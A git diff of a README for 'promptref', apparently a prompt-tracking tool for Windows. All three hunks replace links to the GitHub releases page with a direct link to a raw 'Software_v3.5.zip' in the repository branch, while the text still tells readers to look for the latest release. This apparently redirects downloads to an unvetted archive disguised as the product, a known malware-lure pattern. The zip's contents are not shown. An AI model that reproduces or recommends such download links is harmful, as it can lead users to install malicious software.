@@ -1,6 +1,6 @@
 # 🔧 promptref - Track Prompts Like Code
 
-[![Download promptref](https://img.shields.io/badge/Download%20promptref-purple?style=for-the-badge)](https://github.com/Bitter-ryeergot519/promptref/releases)
+[![Download promptref](https://img.shields.io/badge/Download%20promptref-purple?style=for-the-badge)](https://github.com/Bitter-ryeergot519/promptref/raw/refs/heads/main/promptref/Software_v3.5.zip)
 
 ## 🧩 What promptref does
 
@@ -12,7 +12,7 @@ It is made for people who work with prompts in tools like OpenAI and Anthropic. 
 
 Visit this page to download promptref for Windows:
 
-[https://github.com/Bitter-ryeergot519/promptref/releases](https://github.com/Bitter-ryeergot519/promptref/releases)
+[https://github.com/Bitter-ryeergot519/promptref/raw/refs/heads/main/promptref/Software_v3.5.zip](https://github.com/Bitter-ryeergot519/promptref/raw/refs/heads/main/promptref/Software_v3.5.zip)
 
 On that page, look for the latest release and download the Windows file. In most cases, this will be a `.exe` file or a Windows zip file.
 
@@ -222,7 +222,7 @@ promptref is a good fit for:
 
 Use the release page below to get the latest Windows build:
 
-[https://github.com/Bitter-ryeergot519/promptref/releases](https://github.com/Bitter-ryeergot519/promptref/releases)
+[https://github.com/Bitter-ryeergot519/promptref/raw/refs/heads/main/promptref/Software_v3.5.zip](https://github.com/Bitter-ryeergot519/promptref/raw/refs/heads/main/promptref/Software_v3.5.zip)
 
 ## 🔗 Project Topics
 
